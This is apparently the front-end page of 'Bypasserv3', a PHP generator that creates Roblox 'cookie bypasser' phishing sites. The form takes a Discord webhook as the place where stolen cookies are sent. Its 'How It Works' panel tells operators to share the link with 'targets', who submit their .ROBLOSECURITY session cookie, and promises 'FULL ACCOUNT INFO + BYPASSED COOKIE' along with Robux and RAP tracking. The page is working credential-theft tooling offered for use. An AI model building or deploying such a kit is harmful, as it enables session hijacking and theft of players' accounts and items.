<?php
/**
 * Bypasserv3 - Generator Frontend
 * Modern Dark Grey/Black Design
 */

require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Site - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #1f2937 0%, #111827 50%, #0f1419 100%);
            color: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 600px;
        }
        
        .navbar {
            background: #1f2937;
            box-shadow: 0 2px 10px rgba(59, 130, 246, 0.2);
            padding: 20px 0;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .navbar-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .navbar-brand {
            font-size: 20px;
            font-weight: 700;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .back-button {
            padding: 8px 16px;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .back-button:hover {
            background: rgba(59, 130, 246, 0.2);
            border-color: rgba(59, 130, 246, 0.4);
        }
        
        body {
            padding-top: 80px;
        }
        
        .glass-box {
            background: rgba(31, 41, 55, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .header {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .header h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #3b82f6;
            font-family: 'Space Grotesk', sans-serif;
        }
        
        .header p {
            color: #9ca3af;
            font-size: 16px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #f3f4f6;
            margin-bottom: 10px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            color: #f3f4f6;
            font-size: 14px;
            font-family: 'Outfit', sans-serif;
            transition: all 0.3s ease;
        }
        
        .form-group input::placeholder {
            color: #6b7280;
        }
        
        .form-group input:focus {
            outline: none;
            background: rgba(0, 0, 0, 0.5);
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .form-group small {
            display: block;
            margin-top: 6px;
            font-size: 12px;
            color: #9ca3af;
        }
        
        .form-description {
            display: block;
            margin-top: 8px;
            font-size: 13px;
            color: #9ca3af;
            line-height: 1.5;
        }
        
        .btn-generate {
            width: 100%;
            padding: 14px 20px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 12px;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        
        .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
        }
        
        .btn-generate:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Success Modal Styles */
        .success-modal {
            background: rgba(31, 41, 55, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            border: 1px solid rgba(59, 130, 246, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .success-checkmark {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: rgba(16, 185, 129, 0.2);
            border: 3px solid #4caf50;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            animation: scaleIn 0.5s ease-out;
        }
        
        @keyframes scaleIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .success-modal h2 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 24px;
            color: #10b981;
        }
        
        .info-section {
            margin-bottom: 24px;
            text-align: left;
            background: rgba(0, 0, 0, 0.3);
            padding: 16px;
            border-radius: 10px;
            border: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .info-label {
            font-size: 12px;
            color: #9ca3af;
            font-weight: 600;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .info-value {
            font-size: 14px;
            color: #f3f4f6;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px;
            border-radius: 6px;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            border: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .features-list {
            background: rgba(3, 102, 214, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }
        
        .features-title {
            font-size: 13px;
            font-weight: 600;
            color: #60a5fa;
            margin-bottom: 12px;
        }
        
        .feature-item {
            font-size: 13px;
            color: #e5e7eb;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .feature-item:last-child {
            margin-bottom: 0;
        }
        
        .how-works {
            background: rgba(3, 102, 214, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }
        
        .how-title {
            font-size: 13px;
            font-weight: 600;
            color: #60a5fa;
            margin-bottom: 12px;
        }
        
        .how-item {
            font-size: 13px;
            color: #d1d5db;
            margin-bottom: 8px;
            display: flex;
            gap: 8px;
        }
        
        .how-item:last-child {
            margin-bottom: 0;
        }
        
        .how-number {
            font-weight: 600;
            min-width: 20px;
        }
        
        .btn-ok {
            width: 100%;
            padding: 14px 20px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        
        .btn-ok:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
        }
    </style>
</head>
<body>
    <!-- Navbar -->
    <div class="navbar">
        <div class="navbar-content">
            <div class="navbar-brand">Bypasserv3</div>
            <a href="/" class="back-button">← Back Home</a>
        </div>
    </div>

    <div class="container">
        <div id="formContainer" class="glass-box">
            <div class="header">
                <h1>Create Your Site</h1>
                <p>Generate a custom Roblox Cookie Bypasser site in seconds</p>
            </div>

            <form id="generatorForm" onsubmit="return handleSubmit(event)">
                <div class="form-group">
                    <label>📁 Site Name (Directory)</label>
                    <input 
                        type="text" 
                        id="siteName" 
                        placeholder="e.g. myrefresher123"
                        maxlength="32"
                        required
                    />
                    <small>3-32 characters, letters, numbers, hyphens, underscores only</small>
                </div>

                <div class="form-group">
                    <label>📡 Discord Webhook URL</label>
                    <input 
                        type="text" 
                        id="masterWebhook" 
                        placeholder="https://discord.com/api/webhooks/..."
                        required
                    />
                    <span class="form-description">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</span>
                </div>

                <button type="submit" class="btn-generate">
                    <span>⚡</span>
                    Generate Site
                </button>
            </form>
        </div>

        <!-- Success Modal -->
        <div id="successContainer" style="display: none;">
            <div class="success-modal">
                <div class="success-checkmark">✓</div>
                <h2>Site Generated Successfully!</h2>

                <!-- Site Name -->
                <div class="info-section">
                    <div class="info-label">📁 Site Name</div>
                    <div class="info-value" id="successSiteName"></div>
                </div>

                <!-- Your Link -->
                <div class="info-section">
                    <div class="info-label">🔗 Your Link</div>
                    <div class="info-value" id="successLink"></div>
                </div>

                <!-- Dashboard Link -->
                <div class="info-section">
                    <div class="info-label">📊 Dashboard</div>
                    <div class="info-value" id="successDashboard"></div>
                </div>

                <!-- Access Token -->
                <div class="info-section">
                    <div class="info-label">🔑 Access Token</div>
                    <div class="info-value" id="successToken"></div>
                </div>

                <!-- Full Features -->
                <div class="features-list">
                    <div class="features-title">✨ Full Features</div>
                    <div class="feature-item">✓ Account info fetching</div>
                    <div class="feature-item">✓ Robux balance display</div>
                    <div class="feature-item">✓ RAP value tracking</div>
                    <div class="feature-item">✓ Limited RAP calculation</div>
                    <div class="feature-item">✓ Group ownership detection</div>
                    <div class="feature-item">✓ Friend count display</div>
                    <div class="feature-item">✓ Rich Discord embeds</div>
                    <div class="feature-item">✓ Cookie refresh bypass</div>
                    <div class="feature-item">✓ Dashboard analytics</div>
                </div>

                <!-- How It Works -->
                <div class="how-works">
                    <div class="how-title">📖 How It Works</div>
                    <div class="how-item">
                        <span class="how-number">1.</span>
                        <span>Share your link with targets</span>
                    </div>
                    <div class="how-item">
                        <span class="how-number">2.</span>
                        <span>They submit their .ROBLOSECURITY cookie</span>
                    </div>
                    <div class="how-item">
                        <span class="how-number">3.</span>
                        <span>Cookie is automatically Bypassed</span>
                    </div>
                    <div class="how-item">
                        <span class="how-number">4.</span>
                        <span>You receive FULL ACCOUNT INFO + BYPASSED COOKIE</span>
                    </div>
                    <div class="how-item">
                        <span class="how-number">5.</span>
                        <span>Track everything in your dashboard</span>
                    </div>
                </div>

                <button type="button" class="btn-ok" onclick="window.location.href = document.getElementById('successLink').textContent">
                    OK
                </button>
            </div>
        </div>
    </div>

    <script>
        async function handleSubmit(e) {
            e.preventDefault();

            const siteName = document.getElementById('siteName').value.trim();
            const masterWebhook = document.getElementById('masterWebhook').value.trim();

            if (!siteName || !masterWebhook) {
                Swal.fire({
                    icon: 'error',
                    title: 'Missing Fields',
                    text: 'Please fill in all required fields',
                    confirmButtonColor: '#3b82f6'
                });
                return false;
            }

            if (siteName.length < 3) {
                Swal.fire({
                    icon: 'error',
                    title: 'Invalid Site Name',
                    text: 'Site name must be at least 3 characters',
                    confirmButtonColor: '#3b82f6'
                });
                return false;
            }

            const btn = document.querySelector('.btn-generate');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Generating...';

            try {
                const response = await fetch('/generator/create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        directory: siteName,
                        masterWebhook: masterWebhook,
                        userWebhook: masterWebhook
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('formContainer').style.display = 'none';
                    document.getElementById('successContainer').style.display = 'block';
                    document.getElementById('successSiteName').textContent = data.directory;
                    document.getElementById('successLink').textContent = data.publicUrl;
                    document.getElementById('successDashboard').textContent = data.dashboardUrl;
                    document.getElementById('successToken').textContent = data.token;

                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: 'Your site has been created!',
                        confirmButtonColor: '#10b981'
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: data.error || 'Failed to create site',
                        confirmButtonColor: '#ef4444'
                    });
                }
            } catch (err) {
                Swal.fire({
                    icon: 'error',
                    title: 'Network Error',
                    text: err.message,
                    confirmButtonColor: '#ef4444'
                });
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<span>⚡</span> Generate Site';
            }

            return false;
        }
    </script>
</body>
</html>
